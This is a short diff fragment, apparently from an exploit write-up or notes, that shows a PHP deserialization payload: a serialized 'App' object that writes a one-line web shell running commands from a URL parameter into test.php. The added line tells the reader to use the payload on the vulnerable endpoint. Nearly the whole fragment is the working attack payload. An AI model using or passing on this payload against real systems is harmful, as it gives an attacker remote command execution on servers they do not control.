@@ -50,3 +50,4 @@ O:3:&quot;App&quot;:2:{s:7:&quot;logfile&quot;;s:8:&quot;test.php&quot;;s:7:&quo
 O:3:"App":2:{s:7:"logfile";s:8:"test.php";s:7:"logData";s:27:"<?php system($_GET["c"]);?>";} 
 ```
 
+Use the payload on the vunerable endpoint
